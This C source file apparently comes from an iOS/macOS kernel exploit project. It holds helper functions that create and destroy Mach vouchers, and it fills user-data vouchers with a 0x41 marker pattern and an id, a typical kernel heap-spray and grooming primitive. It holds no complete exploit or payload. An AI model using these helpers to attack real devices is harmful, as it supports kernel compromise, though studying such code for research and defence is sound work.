#include <stdlib.h>
#include <stdint.h>
#include "voucher_utils.h"

host_name_port_t host = MACH_PORT_NULL;

kern_return_t create_voucher(mach_voucher_attr_recipe_t recipe, ipc_voucher_t* voucher)
{
    if (host == MACH_PORT_NULL)
    {
        host = mach_host_self();
    }

    return host_create_mach_voucher(host, (mach_voucher_attr_raw_recipe_array_t)recipe, sizeof(*recipe) + recipe->content_size, voucher);
}

kern_return_t create_user_data_voucher_fast(uint64_t id, ipc_voucher_t* voucher)
{
    mach_voucher_attr_recipe_t recipe = create_recipe_for_user_data_voucher(id);
    kern_return_t kr = create_voucher(recipe, voucher);
    free(recipe);
    return kr;
}

mach_voucher_attr_recipe_data_t* create_recipe_for_user_data_voucher(uint64_t id)
{
    mach_voucher_attr_recipe_t recipe = malloc(sizeof(mach_voucher_attr_recipe_data_t) + DATA_VOUCHER_CONTENT_SIZE);
    memset(recipe, 0, sizeof(mach_voucher_attr_recipe_data_t));
    recipe->key = MACH_VOUCHER_ATTR_KEY_USER_DATA;
    recipe->command = MACH_VOUCHER_ATTR_USER_DATA_STORE;
    recipe->content_size = DATA_VOUCHER_CONTENT_SIZE;
    uint64_t* content = (uint64_t*)recipe->content;
    content[0] = 0x4141414141414141;
    content[1] = id;
    return recipe;
}

kern_return_t destroy_voucher(mach_port_t voucher)
{
    return mach_port_destroy(mach_task_self(), voucher);
}
